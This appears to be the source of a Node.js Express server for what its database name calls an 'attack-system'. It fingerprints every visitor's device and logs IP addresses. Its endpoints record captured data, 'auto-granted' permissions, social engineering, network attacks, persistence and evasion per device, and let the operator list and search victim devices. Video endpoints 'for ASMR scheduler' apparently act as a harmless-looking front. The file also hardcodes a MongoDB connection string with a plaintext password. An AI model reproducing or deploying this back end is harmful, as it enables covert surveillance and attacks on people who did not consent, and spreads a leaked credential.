/**
 * VERCEL PRODUCTION SERVER
 * Device-based data organization with pagination and MongoDB
 */

const express = require('express');
const cors = require('cors');
const helmet = require('helmet');
const compression = require('compression');
const morgan = require('morgan');
const path = require('path');

// MongoDB connection
const mongoose = require('mongoose');

// Import device managers
const { DeviceManager } = require('./device_database_schema');
const DeviceFileManager = require('./device_file_manager');
const { DatabasePagination, FileSystemPagination } = require('./pagination_system');

const app = express();
const PORT = process.env.PORT || 3000;

// MongoDB Connection
async function connectToMongoDB() {
    try {
        const mongoUri = process.env.MONGODB_URI || 'mongodb+srv://dbuser:Bil%40l112@cluster0.ey6gj6g.mongodb.net/attack-system';
        await mongoose.connect(mongoUri, {
            useNewUrlParser: true,
            useUnifiedTopology: true,
        });
        console.log('✅ Connected to MongoDB successfully');
    } catch (error) {
        console.error('❌ MongoDB connection error:', error);
        // Continue without MongoDB for file-based storage
    }
}

// Initialize managers
const deviceManager = new DeviceManager();
const fileManager = new DeviceFileManager();

// Initialize pagination systems
const dbPagination = new DatabasePagination();
const fsPagination = new FileSystemPagination(fileManager);

// Security middleware
app.use(helmet({
    contentSecurityPolicy: {
        directives: {
            defaultSrc: ["'self'"],
            styleSrc: ["'self'", "'unsafe-inline'", "https://fonts.googleapis.com"],
            scriptSrc: ["'self'", "'unsafe-inline'"],
            imgSrc: ["'self'", "data:", "https:"],
            mediaSrc: ["'self'", "https:"],
            connectSrc: ["'self'", "https:"],
            fontSrc: ["'self'", "https://fonts.gstatic.com"]
        }
    }
}));

// Middleware
app.use(cors());
app.use(compression());
app.use(morgan('combined'));
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));

// Serve static files
app.use(express.static(path.join(__dirname, 'public')));

// Device ID extraction middleware
app.use(async (req, res, next) => {
    try {
        // Extract device ID from various sources
        let deviceId = req.headers['x-device-id'] || 
                      req.query.deviceId || 
                      req.body.deviceId ||
                      req.cookies?.deviceId;
        
        // Generate device ID if not provided
        if (!deviceId) {
            deviceId = `device_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
        }
        
        // Get or create device
        const device = await deviceManager.getOrCreateDevice(deviceId, {
            device: deviceId,
            userAgent: req.get('User-Agent'),
            ipAddress: req.ip
        });
        
        // Create session if not exists
        let sessionId = req.headers['x-session-id'] || req.cookies?.sessionId;
        if (!sessionId) {
            const session = await deviceManager.createSession(deviceId, {
                ipAddress: req.ip,
                userAgent: req.get('User-Agent'),
                referrer: req.get('Referrer')
            });
            sessionId = session.sessionId;
        }
        
        // Attach to request
        req.deviceId = deviceId;
        req.sessionId = sessionId;
        req.device = device;
        
        next();
    } catch (error) {
        console.error('❌ Error in device middleware:', error);
        next();
    }
});

// Health check endpoint
app.get('/api/health', (req, res) => {
    res.json({
        status: 'healthy',
        timestamp: new Date().toISOString(),
        uptime: process.uptime(),
        memory: process.memoryUsage(),
        version: '1.0.0',
        deviceId: req.deviceId || 'unknown',
        mongodb: mongoose.connection.readyState === 1 ? 'connected' : 'disconnected'
    });
});

// Main data capture endpoint
app.post('/api/capture', async (req, res) => {
    try {
        const { deviceId, sessionId } = req;
        
        const data = {
            ...req.body,
            timestamp: new Date().toISOString(),
            ip: req.ip,
            userAgent: req.get('User-Agent')
        };
        
        // Save to database
        await deviceManager.logDataCapture(deviceId, sessionId, {
            type: data.type || 'unknown',
            category: data.category || 'general',
            data: data,
            metadata: {
                ipAddress: req.ip,
                userAgent: req.get('User-Agent'),
                url: req.get('Referrer'),
                method: req.method
            }
        });
        
        // Save to file system
        fileManager.saveDeviceData(deviceId, 'data', data);
        
        console.log(`📊 Data captured for device ${deviceId}:`, data.type || 'unknown');
        
        res.json({
            success: true,
            message: 'Data captured successfully',
            deviceId: deviceId,
            sessionId: sessionId,
            timestamp: new Date().toISOString()
        });
    } catch (error) {
        console.error('❌ Error capturing data:', error);
        res.status(500).json({
            success: false,
            error: 'Internal server error'
        });
    }
});

// Permission handling endpoints
app.post('/api/permissions/auto-granted', async (req, res) => {
    try {
        const { deviceId, sessionId } = req;
        
        const permissionData = {
            ...req.body,
            timestamp: new Date().toISOString()
        };
        
        // Save to database
        await deviceManager.logPermission(deviceId, sessionId, {
            permission: req.body.permission,
            action: 'auto-granted',
            method: 'auto_grant',
            success: true
        });
        
        // Save to file system
        fileManager.savePermissionData(deviceId, permissionData);
        
        console.log(`🔓 Permission auto-granted for device ${deviceId}:`, req.body.permission);
        
        res.json({ 
            success: true, 
            message: 'Permission auto-granted',
            deviceId: deviceId
        });
    } catch (error) {
        console.error('❌ Error logging permission:', error);
        res.status(500).json({ success: false, error: 'Internal server error' });
    }
});

app.post('/api/permissions/change', async (req, res) => {
    try {
        const { deviceId, sessionId } = req;
        
        const permissionData = {
            ...req.body,
            timestamp: new Date().toISOString()
        };
        
        // Save to database
        await deviceManager.logPermission(deviceId, sessionId, {
            permission: req.body.permission,
            action: req.body.action || 'change',
            method: req.body.method || 'user_interaction',
            success: req.body.success || false
        });
        
        // Save to file system
        fileManager.savePermissionData(deviceId, permissionData);
        
        console.log(`🔄 Permission changed for device ${deviceId}:`, req.body.permission);
        
        res.json({ 
            success: true, 
            message: 'Permission change logged',
            deviceId: deviceId
        });
    } catch (error) {
        console.error('❌ Error logging permission change:', error);
        res.status(500).json({ success: false, error: 'Internal server error' });
    }
});

app.get('/api/permissions/logs', async (req, res) => {
    try {
        const { deviceId } = req;
        const logs = await deviceManager.getDeviceDataByType(deviceId, 'permissions');
        
        res.json({
            deviceId: deviceId,
            total: logs.length,
            logs: logs,
            timestamp: new Date().toISOString()
        });
    } catch (error) {
        console.error('❌ Error getting permission logs:', error);
        res.status(500).json({ success: false, error: 'Internal server error' });
    }
});

// Social engineering endpoints
app.post('/api/social-engineering/:type', async (req, res) => {
    try {
        const { deviceId, sessionId } = req;
        const { type } = req.params;
        
        const attackData = {
            attackType: 'social_engineering',
            technique: type,
            success: req.body.success || false,
            payload: req.body,
            response: { status: 'logged' },
            duration: req.body.duration || 0,
            severity: req.body.severity || 'medium'
        };
        
        // Save to database
        await deviceManager.logAttack(deviceId, sessionId, attackData);
        
        // Save to file system
        fileManager.saveAttackData(deviceId, {
            type: 'social_engineering',
            technique: type,
            data: req.body,
            timestamp: new Date().toISOString()
        });
        
        console.log(`🧠 Social engineering ${type} for device ${deviceId}`);
        
        res.json({
            success: true,
            message: `${type} logged successfully`,
            deviceId: deviceId
        });
    } catch (error) {
        console.error('❌ Error logging social engineering:', error);
        res.status(500).json({ success: false, error: 'Internal server error' });
    }
});

// Network attack endpoints
app.post('/api/network/:attack', async (req, res) => {
    try {
        const { deviceId, sessionId } = req;
        const { attack } = req.params;
        
        const attackData = {
            attackType: 'network_attack',
            technique: attack,
            success: req.body.success || false,
            payload: req.body,
            response: { status: 'logged' },
            duration: req.body.duration || 0,
            severity: req.body.severity || 'medium'
        };
        
        // Save to database
        await deviceManager.logAttack(deviceId, sessionId, attackData);
        
        // Save to file system
        fileManager.saveNetworkData(deviceId, {
            type: 'network_attack',
            technique: attack,
            data: req.body,
            timestamp: new Date().toISOString()
        });
        
        console.log(`🌐 Network attack ${attack} for device ${deviceId}`);
        
        res.json({
            success: true,
            message: `${attack} logged successfully`,
            deviceId: deviceId
        });
    } catch (error) {
        console.error('❌ Error logging network attack:', error);
        res.status(500).json({ success: false, error: 'Internal server error' });
    }
});

// Persistence endpoints
app.post('/api/persistence/:type', async (req, res) => {
    try {
        const { deviceId, sessionId } = req;
        const { type } = req.params;
        
        // Save to file system
        fileManager.saveDeviceData(deviceId, 'persistence', {
            type: type,
            data: req.body,
            timestamp: new Date().toISOString()
        });
        
        console.log(`🔒 Persistence ${type} for device ${deviceId}`);
        
        res.json({
            success: true,
            message: `${type} logged successfully`,
            deviceId: deviceId
        });
    } catch (error) {
        console.error('❌ Error logging persistence:', error);
        res.status(500).json({ success: false, error: 'Internal server error' });
    }
});

// Evasion endpoints
app.post('/api/evasion/:technique', async (req, res) => {
    try {
        const { deviceId, sessionId } = req;
        const { technique } = req.params;
        
        // Save to file system
        fileManager.saveEvasionData(deviceId, {
            technique: technique,
            data: req.body,
            timestamp: new Date().toISOString()
        });
        
        console.log(`🥷 Evasion ${technique} for device ${deviceId}`);
        
        res.json({
            success: true,
            message: `${technique} logged successfully`,
            deviceId: deviceId
        });
    } catch (error) {
        console.error('❌ Error logging evasion:', error);
        res.status(500).json({ success: false, error: 'Internal server error' });
    }
});

// ML attack endpoints
app.post('/api/ml/:analysis', async (req, res) => {
    try {
        const { deviceId, sessionId } = req;
        const { analysis } = req.params;
        
        // Save to file system
        fileManager.saveMLData(deviceId, {
            analysis: analysis,
            data: req.body,
            timestamp: new Date().toISOString()
        });
        
        console.log(`🤖 ML analysis ${analysis} for device ${deviceId}`);
        
        res.json({
            success: true,
            message: `${analysis} logged successfully`,
            deviceId: deviceId
        });
    } catch (error) {
        console.error('❌ Error logging ML analysis:', error);
        res.status(500).json({ success: false, error: 'Internal server error' });
    }
});

// Device-specific data endpoints with pagination
app.get('/api/device/:deviceId/data', async (req, res) => {
    try {
        const { deviceId } = req.params;
        const { type = 'data' } = req.query;
        
        const baseUrl = `/api/device/${deviceId}/data`;
        const paginatedData = await fsPagination.getPaginatedData(deviceId, type, req.query, baseUrl);
        
        res.json({
            deviceId: deviceId,
            type: type,
            ...paginatedData,
            timestamp: new Date().toISOString()
        });
    } catch (error) {
        console.error('❌ Error getting device data:', error);
        res.status(500).json({ success: false, error: 'Internal server error' });
    }
});

// Paginated device data by type
app.get('/api/device/:deviceId/:dataType', async (req, res) => {
    try {
        const { deviceId, dataType } = req.params;
        const validTypes = ['sessions', 'attacks', 'permissions', 'fingerprints', 'behavioral', 'network', 'storage', 'ml', 'evasion'];
        
        if (!validTypes.includes(dataType)) {
            return res.status(400).json({ 
                success: false, 
                error: `Invalid data type. Valid types: ${validTypes.join(', ')}` 
            });
        }
        
        const baseUrl = `/api/device/${deviceId}/${dataType}`;
        const paginatedData = await fsPagination.getPaginatedData(deviceId, dataType, req.query, baseUrl);
        
        res.json({
            deviceId: deviceId,
            dataType: dataType,
            ...paginatedData,
            timestamp: new Date().toISOString()
        });
    } catch (error) {
        console.error('❌ Error getting device data by type:', error);
        res.status(500).json({ success: false, error: 'Internal server error' });
    }
});

app.get('/api/device/:deviceId/stats', async (req, res) => {
    try {
        const { deviceId } = req.params;
        
        // Get database stats
        const dbStats = await deviceManager.getDeviceStats(deviceId);
        
        // Get file system stats
        const fileStats = fileManager.getDeviceStats(deviceId);
        
        res.json({
            deviceId: deviceId,
            database: dbStats,
            filesystem: fileStats,
            timestamp: new Date().toISOString()
        });
    } catch (error) {
        console.error('❌ Error getting device stats:', error);
        res.status(500).json({ success: false, error: 'Internal server error' });
    }
});

// All devices endpoint with pagination
app.get('/api/devices', async (req, res) => {
    try {
        // Get from database
        const dbDevices = await deviceManager.getAllDevices();
        
        // Get from file system
        const fileDevices = fileManager.getAllDevices();
        
        // Combine and deduplicate devices
        const allDevices = [...dbDevices, ...fileDevices];
        const uniqueDevices = allDevices.filter((device, index, self) => 
            index === self.findIndex(d => d.deviceId === device.deviceId || d._id === device.deviceId)
        );
        
        // Apply pagination
        const paginationParams = new (require('./pagination_system')).PaginationSystem().createPaginationParams(req.query);
        const startIndex = paginationParams.skip;
        const endIndex = startIndex + paginationParams.limit;
        const paginatedDevices = uniqueDevices.slice(startIndex, endIndex);
        
        const baseUrl = '/api/devices';
        const paginatedResponse = new (require('./pagination_system')).PaginationSystem().createPaginatedResponse(
            paginatedDevices,
            uniqueDevices.length,
            paginationParams,
            baseUrl
        );
        
        res.json({
            ...paginatedResponse,
            timestamp: new Date().toISOString()
        });
    } catch (error) {
        console.error('❌ Error getting all devices:', error);
        res.status(500).json({ success: false, error: 'Internal server error' });
    }
});

// Search devices endpoint
app.get('/api/devices/search', async (req, res) => {
    try {
        const { q: searchTerm, type, status } = req.query;
        
        if (!searchTerm) {
            return res.status(400).json({ 
                success: false, 
                error: 'Search term is required' 
            });
        }
        
        // Get all devices
        const dbDevices = await deviceManager.getAllDevices();
        const fileDevices = fileManager.getAllDevices();
        const allDevices = [...dbDevices, ...fileDevices];
        
        // Apply search filter
        let filteredDevices = allDevices.filter(device => {
            const deviceId = device.deviceId || device._id || device.device;
            const deviceStatus = device.status || 'unknown';
            const deviceType = device.type || 'unknown';
            
            const matchesSearch = deviceId.toLowerCase().includes(searchTerm.toLowerCase());
            const matchesType = !type || deviceType === type;
            const matchesStatus = !status || deviceStatus === status;
            
            return matchesSearch && matchesType && matchesStatus;
        });
        
        // Apply pagination
        const paginationParams = new (require('./pagination_system')).PaginationSystem().createPaginationParams(req.query);
        const startIndex = paginationParams.skip;
        const endIndex = startIndex + paginationParams.limit;
        const paginatedDevices = filteredDevices.slice(startIndex, endIndex);
        
        const baseUrl = '/api/devices/search';
        const paginatedResponse = new (require('./pagination_system')).PaginationSystem().createPaginatedResponse(
            paginatedDevices,
            filteredDevices.length,
            paginationParams,
            baseUrl
        );
        
        res.json({
            ...paginatedResponse,
            searchTerm,
            filters: { type, status },
            timestamp: new Date().toISOString()
        });
    } catch (error) {
        console.error('❌ Error searching devices:', error);
        res.status(500).json({ success: false, error: 'Internal server error' });
    }
});

// Video endpoints (for ASMR scheduler)
app.get('/api/videos', (req, res) => {
    res.json({
        message: 'Video endpoints available',
        endpoints: [
            '/api/videos/stats',
            '/api/videos/category/:category',
            '/api/videos/recent',
            '/api/device/:deviceId/videos'
        ],
        timestamp: new Date().toISOString()
    });
});

app.get('/api/videos/stats', (req, res) => {
    res.json({
        totalVideos: 0,
        categories: {},
        storageUsed: '0 MB',
        lastDownload: null,
        timestamp: new Date().toISOString()
    });
});

// Serve the main page
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Catch-all route for SPA
app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Error handling middleware
app.use((error, req, res, next) => {
    console.error('❌ Server error:', error);
    res.status(500).json({
        success: false,
        error: 'Internal server error',
        timestamp: new Date().toISOString()
    });
});

// Start server
if (process.env.NODE_ENV !== 'production') {
    // Connect to MongoDB first
    connectToMongoDB().then(() => {
        app.listen(PORT, () => {
            console.log(`🚀 Server running on http://localhost:${PORT}`);
            console.log(`📊 Health check: http://localhost:${PORT}/api/health`);
            console.log(`📈 Device stats: http://localhost:${PORT}/api/devices`);
            console.log(`🗄️ MongoDB: ${mongoose.connection.readyState === 1 ? 'Connected' : 'Disconnected'}`);
        });
    });
} else {
    // For production (Vercel), connect to MongoDB
    connectToMongoDB();
}

module.exports = app; 